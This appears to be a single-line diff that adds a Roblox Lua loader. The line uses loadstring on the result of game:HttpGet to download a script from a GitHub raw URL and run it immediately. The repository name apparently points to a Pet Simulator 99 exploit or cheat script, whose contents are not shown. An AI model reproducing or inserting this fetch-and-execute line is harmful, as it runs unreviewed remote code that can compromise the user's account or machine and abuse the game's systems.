@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/qw35x0/Ps99PixelzScripts/refs/heads/main/Ps99PixelzPy",true))()
